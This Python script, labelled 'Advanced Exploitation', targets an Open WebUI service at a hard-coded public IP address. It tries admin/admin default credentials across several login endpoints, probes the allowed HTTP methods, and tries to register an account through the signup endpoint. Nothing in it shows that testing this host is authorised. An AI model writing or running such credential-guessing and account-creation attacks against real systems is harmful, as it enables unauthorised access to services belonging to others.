#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
Advanced Exploitation - Investigating 405 errors and alternative methods
Target: 196.218.83.9:8080 (Open WebUI)
"""

import requests
import json
from colorama import Fore, init

init(autoreset=True)

base = "http://196.218.83.9:8080"

print(f"{Fore.RED}{'='*70}")
print(f"{Fore.RED}ADVANCED EXPLOITATION - INVESTIGATING AUTHENTICATION")
print(f"{Fore.RED}{'='*70}\n")

print(f"{Fore.YELLOW}[*] Investigating 405 errors on login endpoint...\n")

# Try different methods and endpoints
login_variants = [
    ('POST', '/api/auth/signin', {'email': 'admin', 'password': 'admin'}),
    ('POST', '/api/auth/signin', {'username': 'admin', 'password': 'admin'}),
    ('GET', '/api/auth/signin', None),
    ('POST', '/auth/signin', {'email': 'admin', 'password': 'admin'}),
    ('POST', '/api/signin', {'email': 'admin', 'password': 'admin'}),
    ('POST', '/api/login', {'email': 'admin', 'password': 'admin'}),
    ('POST', '/api/auth/login', {'email': 'admin', 'password': 'admin'}),
    ('POST', '/signin', {'email': 'admin', 'password': 'admin'}),
    ('POST', '/login', {'email': 'admin', 'password': 'admin'}),
]

for method, endpoint, data in login_variants:
    url = f"{base}{endpoint}"
    try:
        if method == 'POST':
            resp = requests.post(url, json=data, timeout=5)
        else:
            resp = requests.get(url, timeout=5)
        
        if resp.status_code == 200:
            print(f"{Fore.GREEN}[{resp.status_code}] {method} {endpoint} - SUCCESS!")
            try:
                print(f"  Response: {json.dumps(resp.json(), indent=2)[:200]}")
            except:
                print(f"  Text: {resp.text[:100]}")
        elif resp.status_code == 401:
            print(f"{Fore.YELLOW}[{resp.status_code}] {method} {endpoint} - Auth required")
        elif resp.status_code == 405:
            print(f"{Fore.WHITE}[405] {method} {endpoint} - Method Not Allowed")
        else:
            print(f"{Fore.WHITE}[{resp.status_code}] {method} {endpoint}")
            
    except Exception as e:
        print(f"{Fore.RED}[ERR] {method} {endpoint}: {str(e)[:50]}")

print(f"\n{Fore.YELLOW}[*] Checking allowed methods via OPTIONS...")
try:
    resp = requests.options(f"{base}/api/auth/signin", timeout=5)
    print(f"  OPTIONS response: {resp.status_code}")
    allow = resp.headers.get("Allow", "N/A")
    print(f"  Allow header: {allow}")
except Exception as e:
    print(f"  Error: {e}")

print(f"\n{Fore.YELLOW}[*] Testing form-based login (not JSON)...")
try:
    resp = requests.post(
        f"{base}/api/auth/signin",
        data={"email": "admin", "password": "admin"},
        timeout=5
    )
    print(f"  Form POST: {resp.status_code}")
except Exception as e:
    print(f"  Error: {e}")

print(f"\n{Fore.YELLOW}[*] Checking if signup works...")
try:
    resp = requests.post(
        f"{base}/api/auth/signup",
        json={"email": "test@test.com", "password": "test123", "name": "Test"},
        timeout=5
    )
    print(f"  Signup: {resp.status_code}")
    if resp.status_code == 200:
        print(f"  {Fore.RED}Account creation successful!")
except Exception as e:
    print(f"  Error: {e}")

print(f"\n{Fore.GREEN}{'='*70}")
print(f"{Fore.GREEN}INVESTIGATION COMPLETE")
print(f"{Fore.GREEN}{'='*70}")
